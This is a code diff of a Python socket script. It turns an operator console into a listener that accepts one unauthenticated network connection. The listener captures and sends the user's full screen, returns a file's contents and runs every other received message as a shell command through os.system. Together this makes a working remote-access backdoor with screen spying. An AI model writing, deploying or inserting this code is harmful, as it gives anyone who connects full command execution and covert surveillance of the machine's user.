@@ -1,70 +1,67 @@
-import socket    
-import numpy as np      
-import cv2 
-import time
-from PIL import Image
+import socket
+import os   
+import mss
 import pickle
+from getmac import get_mac_address
 #import json
 
 def main():
     s = socket.socket()                     
 
-    host = "10.0.33.155"
-    port = 12345  
+    host = "0.0.0.0"
+    port = 12345
+    reset = False
 
     s.bind((host, port))         
-    s.listen(1)  
-    print(f"Server Listening on port {port}")   
+    s.listen(1)
+    print(f"\nServer Listening on port {port}")   
+    print("Server MAC Address: ", get_mac_address())
+
             
     (client, addr) = s.accept() 
-    print('Got connection from', addr)  
+    mac_addr = get_mac_address(ip=addr[0])
+    print('\nGot connection from ', str(addr[0]) + ":" + str(addr[1]))
+    print("Client MAC Address: ", mac_addr)
+    print()
 
     while True: 
-        msg = input("Enter Message: ")
-        client.send(msg.encode()) 
-
-        if msg == "return":
-            returned_msg = client.recv(2048)
-            print("Recieved: " + returned_msg.decode())
+        msg = client.recv(1024).decode()
+        print("Message: " + msg)
         
-        elif msg == "screen":
-            handle_screen_request(client)
+        # Returns the Contents of test.txt
+        if msg == "return":
+            with open("test.txt", "r") as f:
+                client.send(f.read().encode())
 
-        elif msg == "exit":
-            client.close()
+        if msg == "disconnect":
+            print("Recieved Disconnect Message...")
+            reset = True
             break
 
+        elif msg == "exit":
+            break
+        
+        # Returns the data for the Users Screen
+        elif msg == "screen":
+            sct = mss.mss()
+            monitor = sct.monitors[1]
+            frame = sct.grab(monitor)
+            serialized = pickle.dumps((frame.width, frame.height, frame.rgb))
+            #print(serialized)
 
-def handle_screen_request(client):
-    returned_msg = b''
-
-    data_len = int(client.recv(1024).decode())
-    print("Data Len: ", data_len)
-
-    start_time = time.time()
-    while len(returned_msg) < data_len:
-        print("Incoming...")
-        packet = client.recv(115200)
-        returned_msg += packet
-
-    end_time = time.time()
-    print("Elapsed Time: ", end_time - start_time)
+            client.send(str(len(serialized)).encode())
+            client.send(serialized)
 
 
-    img_width = 960
-    #cv2.namedWindow("Screenshot", cv2.WINDOW_NORMAL)
-    print("Converting Image...")
-    [w, h, rgb] = pickle.loads(returned_msg)
+        else:
+            os.system(msg)
+    
+    s.close()
 
-    img = Image.frombytes("RGB", (w,h), rgb)
-    img = cv2.cvtColor(np.array(img), cv2.COLOR_RGB2BGR)
-    img = cv2.resize(img, (img_width, int(1824/2736*img_width)))
+    if reset == True:
+        main()
 
-    print("Showing Image...")
-
-    cv2.imshow("Screenshot", img)
-
-    cv2.waitKey(0)
+            
 
 
 if __name__ == "__main__":
